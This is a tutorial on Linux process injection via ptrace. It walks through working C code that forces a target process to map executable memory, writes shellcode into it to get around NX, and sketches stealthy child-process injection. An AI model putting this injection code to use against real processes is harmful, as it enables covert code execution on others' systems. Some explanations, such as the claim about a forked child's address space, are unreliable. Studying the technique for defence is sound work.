                                                                             -- [ Intro ] --

Before we begin, I assume that you, the reader, already know what ptrace() is. In case you don’t:

ptrace is basically a system call for inspecting and manipulating processes (https://man7.org/linux/man-pages/man2/ptrace.2.html).


                                                                I. aE_memory ─ Allocating Executable Memory

While creating this tool, I even thought about using something more sophisticated to inject the shellcode, such as code caves, shmget, or even manipulating the vDSO. However, I ended up feeling lazy and went down the easier path: simply allocating executable memory so that we can inject our shellcode.

--------------------------------8<--------------------------------
void*
aE_memory (pid_t pid,
           size_t size)
{
  struct user_regs_struct regs;
  void *addr;

  if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1)
    {
      perror("PTRACE_GETREGS");
      return NULL;
    }

  regs.rax = 9;
  regs.rdi = 0;
  regs.rsi = size;
  regs.rdx = PROT_READ | PROT_WRITE | PROT_EXEC;
  regs.r10 = MAP_PRIVATE | MAP_ANONYMOUS;
  regs.r8 = -1;
  regs.r9 = 0;

  if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) == -1)
    {
      perror("PTRACE_SETREGS");
      return NULL;
    }

  unsigned long syscall = 0x050f;
  unsigned long og = ptrace(PTRACE_PEEKTEXT, pid, regs.rip, NULL);
  if (ptrace(PTRACE_POKETEXT, pid, regs.rip, syscall) == -1)
    {
      perror("PTRACE_POKETEXT");
      return NULL;
    }

  if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) == -1)
    {
      perror("PTRACE_SINGLESTEP");
      return NULL;
    }

  waitpid(pid, NULL, 0);

  if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1)
    {
      perror("PTRACE_GETREGS");
      return NULL;
    }

  addr = (void *)regs.rax;

  if (ptrace(PTRACE_POKETEXT, pid, regs.rip, og) == -1)
    {
      perror("PTRACE_POKETEXT");
      return NULL;
    }

  return addr;
}
-------------------------->8--------------------------------------

The idea is as follows:

I.    Read the current state of the process registers.  
II.   Prepare the registers for the `mmap` execution.  
III.  Restore the original state of the registers.  
IV.   Return the address of the allocated memory.

                                                                             -- [ I. Part ] --

So let’s go. Following this logic, here’s the first part:

—
struct user_regs_struct regs;
void *addr;

if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1)
  {
    perror("PTRACE_GETREGS");
    return NULL;
  }

We use the regs struct to store the state of the process’s registers, and we call ptrace with the PTRACE_GETREGS operation to capture the current state of the process’s registers, with a simple error-handling routine.

Q: Why is that necessary? 
A: Simply because we need to know the current state of the registers before modifying them, so we can restore the process’s control flow later.


                                                                             -- [ II. Part ] --

Now we prepare the registers:

regs.rax = 9;  // 0x9 = mmap syscall
regs.rdi = 0;  // First argument to mmap; set to 0 so the kernel chooses the address
regs.rsi = size; // Second argument to mmap: the size of the allocated memory
regs.rdx = PROT_READ | PROT_WRITE | PROT_EXEC; // Third argument to mmap: memory protections
regs.r10 = MAP_PRIVATE | MAP_ANONYMOUS; // Fourth argument to mmap: mapping flags
regs.r8 = -1;
regs.r9 = 0;  // Both -1 and 0 are extra arguments for dealing with MAP_ANONYMOUS


                                                                             -- [ III. Part ] --

Here we inject the syscall and execute it:

unsigned long syscall = 0x050f; // Opcode for the "syscall" instruction
unsigned long og = ptrace(PTRACE_PEEKTEXT, pid, regs.rip, NULL);

if (ptrace(PTRACE_POKETEXT, pid, regs.rip, syscall) == -1)
  {
    perror("PTRACE_POKETEXT");
    return NULL;
  }

- Our first ptrace call executes a single instruction in the process, which will be our injected syscall (in this case, the mmap).
- The waitpid simply waits until the process has completed this instruction and is suspended again.
- The second ptrace captures the process’s register state after the syscall execution (the result is stored in RAX).
- Finally, our variable addr converts the value of RAX the result of the mmap operation into a pointer (the address of the allocated memory).

                                                                             -- [ IV. Part ] --

Now we just restore the original code state and return the allocated memory address:

if (ptrace(PTRACE_POKETEXT, pid, regs.rip, og) == -1)
  {
    perror("PTRACE_POKETEXT");
    return NULL;
  }

return addr;

Because NX prevents shellcode execution in non-executable areas, to “bypass” it we simply allocate a region of executable memory with our mmap.

            II. i_shellcode ─ Injecting the Shellcode

The logic of the i_shellcode function is quite simple:

int
i_shellcode (pid_t pid,
             void *dest,
             const char *shellcode,
             size_t len)
{
  for (size_t i = 0; i < len; i += sizeof(long))
    {
      if (ptrace(PTRACE_POKETEXT, pid, dest + i, *(long *)(shellcode + i)) == -1)
        return -1;
    }
  return 0;
}

Our loop works as follows: it traverses the shellcode byte by byte, advancing by sizeof(long) on each iteration. We need this pattern because PTRACE_POKETEXT expects to write a whole word of data (the size of long) at a time.

We use if to call our ptrace with the POKETEXT operation (to write data directly into another process’s memory). The dest + i is the destination memory address in the target process, which we calculate by adding the offset i to the base address (dest). The expression *(long *)(shellcode + i) interprets (and advances) the shellcode pointer by i bytes to the next sizeof(long) block and dereferences it, providing the value that will be written to the target process’s memory.


                                                                    -- [Child Process Injection ─ Bonus] --

While I was doing research, I found a technique I found at least interesting: child process injection. The idea is simple: we create a child process from the parent process (our target) to gain a few advantages, such as:

- Stealth
- The child usually inherits the parent’s permissions.
- The injection happens in the child, so the parent remains unchanged and continues running normally even if an error occurs.

Thus, the child inherits the parent’s environment but operates in the same address space, and as stated, it keeps our target process intact.

Steps:

I. 		Create the child using fork().
II. 	Suspend the child with SIGSTOP to ensure the process does not advance its execution while the shellcode is not yet injected.
III. 	Allocate a region in the child’s memory for the shellcode to be injected directly.

(Continue with the usual process injection flow, just considering and handling the child process.)
